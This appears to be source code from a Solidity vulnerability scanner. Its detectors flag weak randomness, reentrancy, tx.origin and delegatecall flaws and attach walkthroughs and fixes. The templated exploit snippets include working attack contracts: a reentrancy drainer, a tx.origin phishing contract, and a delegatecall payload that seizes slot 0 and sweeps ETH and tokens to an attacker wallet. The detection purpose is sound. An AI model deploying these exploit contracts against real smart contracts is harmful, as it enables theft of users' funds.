      walkthrough: "1. Anyone can increase a contract's ETH balance without calling it.\n2. require(address(this).balance == expected) starts failing permanently.\n3. Compare against an internal accounted variable, or use >=.",
      exploitSolidity: `selfdestruct(payable(victim)); // balance is now expected + 1`,
      remediationSolidity: `require(accounted == expected, "accounting");`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  // Randomness = block data actually used as entropy, not merely read.
  // blockhash / prevrandao / difficulty alone are entropy (a hash or a
  // beacon value). block.timestamp / now / block.number / block.coinbase
  // alone are a CLOCK (round deadlines, vesting) — they only become
  // entropy when mixed into a hash or a modulo selection. The old
  // keyword fallback (any mention of "winner"/"lottery"/...) fired on
  // event fields, comments, and variable names: FomoXP's withdraw,
  // buyCore, reLoadCore use `now` as a round clock and mention
  // winnerAddr in an event, but draw no randomness. View/pure functions
  // cannot draw randomness that decides anything on-chain.
  //
  // All randomness regexes run on `clean` (comments and string
  // literals stripped, Fix 1c): F3Dx endRound's only `%` were the
  // `// 40% to winner` / `// 10% to dev rewards` comments, and a `%`
  // in a string is not a modulo. Entropy mixing requires block data
  // INSIDE the hash input (Fix 1b): keccak of EIP-712 typed data
  // (delegateBySig) does not mix entropy. An oracle-query nonce
  // (Fix 19) and a hash used only as an identifier (Fix 20) are not
  // randomness either.
  const clean = stripCommentsAndStrings(src);
  const entropySource = /blockhash\s*\(|block\.prevrandao|block\.difficulty/.test(clean);
  const clockSource = /block\.timestamp|\bnow\b|block\.number|block\.coinbase/.test(clean);
  const mixesEntropy = hashInputHasBlockData(clean) || moduloOfBlockData(clean);
  const oracleOnly = oracleNonceOnly(clean, fn.name);
  const idOnly = !entropySource && hashOnlyAsIdentifier(clean);
  const randomish = fn.mutability !== "view" && fn.mutability !== "pure" && !oracleOnly && !idOnly && (entropySource || (clockSource && mixesEntropy));
  if (randomish) {
    push(make({
      severity: "high",
      swc: "SWC-120",
      title: `${fn.name} draws randomness from the chain`,
      confidence: "medium",
      detector: "weak-randomness",
      summary: "block.timestamp, prevrandao, difficulty, or blockhash is mixed into a number someone can bias. Miners and searchers see it before they decide to include the transaction.",
      walkthrough: "1. The inputs are known in the mempool, or nudgeable by the block producer.\n2. A caller who dislikes the result waits a block or uses a different sender.\n3. Use a VRF, or commit-reveal with a penalty.",
      exploitSolidity: `// Wait until uint256(keccak256(abi.encode(block.timestamp, msg.sender))) % n == winningIndex.`,
      remediationSolidity: "// Chainlink VRF, or a commit in block n revealed in block n+k.",
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  } else if (/block\.timestamp|\bnow\b/.test(clean) && /(require|if)\s*\(/.test(clean)) {
    // Long-window computation: timestamp divided by >= 1 hour (e.g.
    // (block.timestamp - last) / (60*60*24)) — a ~15s producer shift is
    // immaterial over a days-scale window, so that is info, not low.
    const tsIdx = clean.indexOf("block.timestamp");
    const afterTs = tsIdx >= 0 ? clean.slice(tsIdx) : clean;
    const longWindow = (() => {
      const paren = afterTs.match(/\/\s*\(\s*([\d\s*]+)\)/);
      if (paren) {
        const nums = paren[1].split("*").map((n) => parseInt(n.trim(), 10)).filter((n) => Number.isFinite(n));
        if (nums.length > 0 && nums.reduce((a, b) => a * b, 1) >= 3600) return true;
      }
      const unit = afterTs.match(/\/\s*(\d+)\s*(days|hours|minutes)\b/);
      if (unit) {
        const mult = unit[2] === "days" ? 86400 : unit[2] === "hours" ? 3600 : 60;
        if (parseInt(unit[1], 10) * mult >= 3600) return true;
      }
      const lit = afterTs.match(/\/\s*(\d+)\b/);
      if (lit && parseInt(lit[1], 10) >= 3600) return true;
      return false;
    })();
    push(make({
      severity: longWindow ? "info" : "low",
      swc: "SWC-116",
      title: longWindow ? `${fn.name} uses block.timestamp in a long-window computation` : `${fn.name} branches on block.timestamp`,
      confidence: "medium",
      detector: "timestamp",
      summary: longWindow
        ? "block.timestamp feeds a computation divided by >= 1 hour. A producer can shift it by roughly 15 seconds, which is immaterial over a window this long."
        : "A timestamp check is fine for multi-hour windows. It is a soft gate around a single block: producers can shift it by roughly 15 seconds.",
      walkthrough: "1. Identify whether the window is a long vest or a one-block race.\n2. If funds move the moment the timestamp crosses a line, a producer can include or exclude the winning transaction.",
      exploitSolidity: "",
      remediationSolidity: "// Keep timestamp gates for coarse deadlines only.",
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  if (/extcodesize/.test(src)) {
    push(make({
      severity: "medium",
      swc: null,
      title: `${fn.name} uses extcodesize as an identity check`,
      confidence: "low",
      detector: "extcodesize",
      summary: "extcodesize(addr) == 0 is true for EOAs and also for a contract that is still inside its constructor. It does not prove the caller is an EOA once they call you from a constructor.",
      walkthrough: "1. During construction, the address has no code yet.\n2. A constructor can call this function and pass the check, then finish deploying.\n3. Do not use it for security. If you must block contracts, accept the constructor bypass explicitly.",
      exploitSolidity: `contract Bypass {\n    constructor(address victim) {\n        Victim(victim).mint(); // extcodesize(address(this)) == 0 here\n    }\n}`,
      remediationSolidity: "// Drop the check, or use tx.origin == msg.sender only with eyes open (it has its own phishing problem).",
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  for (const p of fn.params) {
    if (p.name && contract.stateVars.some((v) => v.name === p.name)) {
      push(make({
        severity: "low",
        swc: "SWC-119",
        title: `${fn.name} shadows state variable ${p.name}`,
        confidence: "high",
        detector: "shadowing",
        summary: `Parameter ${p.name} hides the state variable of the same name. An assignment may update the local and leave storage unchanged.`,
        walkthrough: "1. Inside the function the name binds to the parameter.\n2. `p = msg.sender` does not change storage.\n3. Rename the parameter.",
        exploitSolidity: "",
        remediationSolidity: `function ${fn.name}(address _${p.name}) external { ${p.name} = _${p.name}; }`,
        locationFn: fn.name,
        locationLine: fn.line,
        snippet: snippet(parsed, fn.line + delta, delta),
      }));
      break;
    }
  }

  if (/\.(transferFrom)\s*\(/.test(src) && /balances\s*\[[^\]]+\]\s*(\+=|=)/.test(src) && !/balanceOf/.test(src)) {
    push(make({
      severity: "low",
      swc: null,
      title: `${fn.name} assumes a transfer moved the full amount`,
      confidence: "low",
      detector: "fee-on-transfer",
      summary: "The function credits an input amount after transferFrom and never measures the balance delta. Fee-on-transfer and rebasing tokens desynchronize the books.",
      walkthrough: "1. transferFrom returns success but the contract receives less than `amount`.\n2. The internal balance still increases by `amount`.\n3. Later withdrawals pay out more than the contract holds.",
      exploitSolidity: "",
      remediationSolidity: `uint256 beforeBal = token.balanceOf(address(this));\ntoken.safeTransferFrom(msg.sender, address(this), amount);\nuint256 received = token.balanceOf(address(this)) - beforeBal;\nbalances[msg.sender] += received;`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  const addrWrite = contract.stateVars.find((v) => v.typeName === "address" && rx(`\\b${v.name}\\s*=\\s*${fn.params.find((p) => p.typeName === "address")?.name}\\b`).test(src));
  // A zero guard for THIS parameter exempts the write: require(p != 0),
  // require(p != address(0)), if (p == 0) throw/revert. The old check only
  // saw address(0), so `if (newOwner == 0) throw` was still flagged.
  const zeroParam = fn.params.find((p) => p.typeName === "address")?.name;
  const hasZeroGuard = Boolean(
    zeroParam &&
      rx(
        `(require\\s*\\(\\s*${zeroParam}\\s*!=|if\\s*\\(\\s*${zeroParam}\\s*==\\s*(0\\b|address\\s*\\(\\s*0\\s*\\)))`,
      ).test(src),
  );
  // Fix 28: an INTERNAL (or private) zero-address setter fires only
  // when some reachable caller can pass zero without a gate. OZ
  // _transferOwnership's only callers are transferOwnership (requires
  // newOwner != address(0)) and renounceOwnership (intentionally
  // zeroes) — so it does not flag. Public/external setters keep
  // flagging on their own shape (no caller analysis needed).
  const isInternalSetter = fn.visibility === "internal" || fn.visibility === "private";
  if (addrWrite && !hasZeroGuard && !/address\s*\(\s*0\s*\)/.test(src) && !fn.isConstructor && !(isInternalSetter && !internalZeroSetterHasUngatedCaller(fn, contract, model))) {
    push(make({
      severity: "medium",
      swc: null,
      title: `${fn.name} can set ${addrWrite.name} to the zero address`,
      confidence: "medium",
      detector: "zero-address",
      summary: `An address argument is stored in ${addrWrite.name} with no address(0) check. A zero owner or oracle bricks every later authorization or price read.`,
      walkthrough: "1. The parameter is written straight into storage.\n2. address(0) then passes `signer == oracle` style checks for the wrong reason, or makes onlyOwner permanently false.\n3. require(next != address(0)).",
      exploitSolidity: "",
      remediationSolidity: `require(next != address(0), "zero");\n${addrWrite.name} = next;`,
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: snippet(parsed, fn.line + delta, delta),
    }));
  }

  // Pre-0.4.21 code invokes events without the `emit` keyword
  // (OwnerChanged(newOwner);), so a bare /emit/ test false-positives on
  // 0.4.x contracts. A call to a declared event name counts as an emit.
  const emitsEvent = /emit\s+/.test(src) || contract.events.some((e) => rx(`\\b${e.name}\\s*\\(`).test(src));
  if (writesOwner(src, contract) && !emitsEvent && !fn.isConstructor) {
    push(make({
      severity: "info",
      swc: null,
      title: `${fn.name} changes an authority variable without an event`,
      confidence: "medium",
      detector: "missing-event",
      summary: "Owner, admin, or oracle is reassigned and the function emits nothing. Off-chain monitors will not see the rotation.",
      walkthrough: "1. Events are how indexers notice privilege changes.\n2. Emit the previous and next value.",
      exploitSolidity: "",
      remediationSolidity: "emit OwnershipTransferred(previous, next);",
      locationFn: fn.name,
      locationLine: fn.line,
      snippet: "",
    }));
  }

  for (const v of contract.stateVars) {
    if (/password|secret|privatekey|apikey|seedphrase|mnemonic/i.test(v.name)) {
      push(make({
        severity: "info",
        swc: "SWC-136",
        title: `${v.name} looks like a secret stored on-chain`,
        confidence: "medium",
        detector: "private-secret",
        summary: "Storage is public. private and internal only change the compiler's accessor rules. The value is readable with eth_getStorageAt.",
        walkthrough: "1. Deploy, then read the slot.\n2. Nothing in the contract can hide a key from a node.\n3. Keep secrets off-chain or store a hash and reveal later.",
        exploitSolidity: "",
        remediationSolidity: "bytes32 public commitment; // keccak256(secret), not the secret",
        locationFn: null,
        locationLine: v.line,
        snippet: snippet(parsed, v.line + delta, delta),
      }));
    }
  }
  // Fix 30: abi.encodePacked fires ONLY when the packed bytes flow
  // into a hash (keccak256/sha3). Plain string concatenation
  // (MettiApe tokenURI: abi.encodePacked(currentBaseURI,
  // tokenId.toString(), baseExtension) for a string return) has no
  // collision: there is no hash to collide on. Text-based: for each
  // encodePacked call with >= 2 args and at least one dynamic arg (a
  // param/state var whose type is string/bytes/array but not a fixed
  // bytesN), flag only when (a) the call sits inside a keccak256( /
  // sha3( argument span, or (b) its assigned variable flows into a
  // hash call elsewhere in the function. Runs on a
  // length-preserving comment/string-stripped copy (Fix 1c class):
  // a commented-out or string-literal encodePacked/hash cannot flag,
  // and line numbers still match the original source.
  {
    const text = stripCommentsAndStringsKeepLines(src);
    const hashSpans: Array<[number, number]> = [];
    for (const m of text.matchAll(/\b(keccak256|sha3)\s*\(/g)) {
      const openIdx = m.index + m[0].length - 1;
      const closeIdx = parenClose(text, openIdx);
      if (closeIdx >= 0) hashSpans.push([openIdx, closeIdx]);
    }
    const dynamicArg = (arg: string): boolean => {
      const id = arg.trim().match(/^([A-Za-z_$][\w$]*)/)?.[1] ?? "";
      const p = fn.params.find((x) => x.name === id);
      const s = contract.stateVars.find((x) => x.name === id);
      const t = p?.typeName ?? s?.typeName ?? "";
      return /string|bytes|\[\]/.test(t) && !/bytes32|bytes16|bytes4/.test(t);
    };
    for (const m of text.matchAll(/abi\.encodePacked\s*\(/g)) {
      const openIdx = m.index + m[0].length - 1;
      const closeIdx = parenClose(text, openIdx);
      if (closeIdx < 0) continue;
      const args = splitTopLevel(text.slice(openIdx + 1, closeIdx));
      if (args.length < 2) continue;
      if (!args.some(dynamicArg)) continue;
      const callStart = m.index;
      const callEnd = closeIdx;
      const insideHash = hashSpans.some(([hs, he]) => hs < callStart && callEnd < he);
      let varFlowsToHash = false;
      if (!insideHash) {
        // The variable assigned the packed bytes: the last
        // `identifier =` before the call in this statement.
        const stmtStart = Math.max(text.lastIndexOf(";", callStart), text.lastIndexOf("{", callStart), text.lastIndexOf("}", callStart)) + 1;
        const stmtEnd = text.indexOf(";", callEnd);
        const stmt = text.slice(stmtStart, stmtEnd < 0 ? src.length : stmtEnd);
        const assignMatches = [...stmt.slice(0, callStart - stmtStart).matchAll(/([A-Za-z_$][\w$]*)\s*=(?!=)/g)];
        const assigned = assignMatches[assignMatches.length - 1]?.[1];
        if (assigned) {
          varFlowsToHash = hashSpans.some(([hs, he]) => rx(`\\b${assigned}\\b`).test(text.slice(hs, he)));
        }
      }
      if (!insideHash && !varFlowsToHash) continue;
      const callLine = fn.line + (text.slice(0, callStart).match(/\n/g) ?? []).length;
      push(make({
        severity: "medium",
        swc: "SWC-133",
        title: `${fn.name} hashes abi.encodePacked dynamic arguments`,
        confidence: "medium",
        detector: "encode-packed",
        summary: "encodePacked concatenates without lengths. Two dynamic values (string, bytes, arrays) can be rearranged by the caller so different inputs share one hash.",
        walkthrough: [
          "1. encodePacked(string a, string b) is just the raw bytes of a followed by b.",
          '2. ("ab","c") and ("a","bc") produce the same payload and the same keccak.',
          "3. If that hash is a signature preimage, an allowance, or a commitment, the collision is the exploit.",
        ].join("\n"),
        exploitSolidity: `// Both hash to the same digest:
keccak256(abi.encodePacked("ab", "c"));
keccak256(abi.encodePacked("a", "bc"));`,
        remediationSolidity: `bytes32 hash = keccak256(abi.encode(id, note)); // length-prefixed`,
        locationFn: fn.name,
        locationLine: callLine,
        snippet: snippet(parsed, callLine + delta, delta),
      }));
    }
  }
}

function writesOwner(src: string, contract: ContractModel): boolean {
  return contract.stateVars.some((v) => PRIVILEGED.test(v.name) && rx(`\\b${v.name}\\s*=`).test(src));
}

function hasDivThenMul(body: AstNode | null): boolean {
  let hit = false;
  const visit = (node: unknown, parentMul: boolean) => {
    if (!node || typeof node !== "object" || hit) return;
    if (Array.isArray(node)) {
      node.forEach((n) => visit(n, parentMul));
      return;
    }
    const n = node as AstNode;
    const isMul = n.type === "BinaryOperation" && n.operator === "*";
    if (isMul && (isDivNode(n.left) || isDivNode(n.right))) hit = true;
    for (const [k, v] of Object.entries(n)) {
      if (k === "loc" || k === "range") continue;
      if (v && typeof v === "object") visit(v, isMul || parentMul);
    }
  };
  visit(body, false);
  return hit;
}

function isDivNode(node: unknown): boolean {
  const n = unwrapExpr(node);
  return Boolean(n && n.type === "BinaryOperation" && n.operator === "/");
}

function unwrapExpr(node: unknown): AstNode | null {
  if (!node || typeof node !== "object") return null;
  const n = node as AstNode;
  if (n.type === "TupleExpression" && Array.isArray(n.components) && n.components.length === 1) {
    return unwrapExpr(n.components[0]);
  }
  return n;
}

function originWalk(name: string): string {
  return [
    `1. ${name} reads tx.origin, the EOA that signed the outer transaction.`,
    "2. msg.sender can be a contract. The check does not notice.",
    "3. The victim is persuaded to call an attacker contract (a fake 'claim' or approval helper).",
    "4. That contract calls this function. tx.origin is still the victim, so the check passes, and the attacker is the one who receives the side effect.",
  ].join("\n");
}

function originExploit(contractName: string, fn: string): string {
  return `interface IVictim { function ${fn}(address payable to) external; }

contract Phish {
    function lure(address victim, address payable me) external {
        // The owner calls lure(). tx.origin inside ${contractName} is the owner.
        IVictim(victim).${fn}(me);
    }
}`;
}

function originFix(): string {
  return `require(msg.sender == owner, "owner");`;
}

function reentrancyWalk(contractName: string, fn: FnModel, call: ExtCall | null): string {
  return [
    `1. ${contractName}.${fn.name} reaches an external call${call ? ` (${call.kind} at line ${call.line})` : ""}.`,
    "2. The callee's fallback or receive runs before this function finishes.",
    "3. Storage that the call depends on — a balance, a paid flag, a share total — is updated only after the call returns, so the re-entering call still sees the old value.",
    "4. Repeat until the ether or the credit is gone. A sibling function that reads the same storage can be used instead of calling this function again.",
  ].join("\n");
}

function reentrancyExploit(contractName: string, fn: string): string {
  return `interface IVictim { function deposit() external payable; function ${fn}() external; }

contract Reenter {
    IVictim victim;
    uint256 hits;
    constructor(address v) { victim = IVictim(v); }
    function attack() external payable {
        victim.deposit{value: msg.value}();
        victim.${fn}();
    }
    receive() external payable {
        if (hits++ < 5 && address(victim).balance > 0) victim.${fn}();
    }
}`;
}

function reentrancyFix(fn: string): string {
  return `// Checks, then effects, then interaction.
function ${fn}() external nonReentrant {
    uint256 amount = balances[msg.sender];
    balances[msg.sender] = 0;
    (bool ok, ) = msg.sender.call{value: amount}("");
    require(ok);
}`;
}

function delegateWalk(fn: string, call: ExtCall): string {
  return [
    `1. ${fn} delegatecalls ${call.target || "the target"} at line ${call.line}.`,
    "2. The target's code executes in the caller's storage context with the original msg.sender.",
    call.targetIsParam
      ? "3. Storage Collision: Target is a caller-supplied address. An attacker points it to an implementation matching slot 0 layout to overwrite owner/admin state."
      : "3. If that address is changeable, whoever controls it can point to an implementation that overwrites slot 0.",
    "4. Atomic Exploitation: Once slot 0 is seized, the attacker executes privileged administrative sweeps/drains in the same atomic transaction before external detection.",
  ].join("\n");
}

function delegateExploit(contractName: string): string {
  return `// 1. Malicious Implementation payload matching victim slot 0 layout
contract MultiStepSmash {
    // Slot 0 in victim contract (e.g. owner/admin)
    address public owner;

    // Comprehensive attack payload executed via delegatecall
    function seizeAndDrain(address token, address payable recipient) external {
        // Step 1: Overwrite Slot 0 to take ownership
        owner = msg.sender;

        // Step 2: Leverage newly acquired privileges to sweep balance or tokens
        if (address(this).balance > 0) {
            recipient.transfer(address(this).balance);
        }
        if (token != address(0)) {
            (bool ok, bytes memory balData) = token.staticcall(
                abi.encodeWithSignature("balanceOf(address)", address(this))
            );
            if (ok && balData.length >= 32) {
                uint256 bal = abi.decode(balData, (uint256));
                if (bal > 0) {
                    token.call(abi.encodeWithSignature("transfer(address,uint256)", recipient, bal));
                }
            }
        }
    }
}

interface IERC20 { function balanceOf(address account) external view returns (uint256); }
interface IVictim { function migrate(address impl, bytes calldata data) external; }

// 2. Orchestrator contract executing atomic takeover and drain
contract AdvancedTake {
    function go(address victim) external {
        MultiStepSmash smash = new MultiStepSmash();
        bytes memory payload = abi.encodeWithSignature(
            "seizeAndDrain(address,address)",
            address(0),
            payable(msg.sender)
        );
        IVictim(victim).migrate(address(smash), payload);
    }

    function executeAttack(address victim, address rewardToken, address attackerWallet) external {
        MultiStepSmash smash = new MultiStepSmash();
        bytes memory payload = abi.encodeWithSignature(
            "seizeAndDrain(address,address)",
            rewardToken,
            payable(attackerWallet)
        );
        IVictim(victim).migrate(address(smash), payload);
    }
}
// ${contractName}'s slot 0 is overwritten and assets are atomically drained.`;
}

export function contractSurface(model: SourceModel) {
  return model.contracts.map((c) => ({
    name: c.name,
    kind: c.kind,
    bases: c.bases,
    stateVars: c.stateVars,
    functions: c.functions.map((f) => ({
      name: f.name,
      visibility: f.visibility,
      mutability: f.mutability,
      modifiers: f.modifiers,
      line: f.line,
      params: f.params.map((p) => `${p.typeName} ${p.name}`.trim()).join(", "),
    })),
    events: c.events,
  }));
}

export type { StateVar, ModModel };
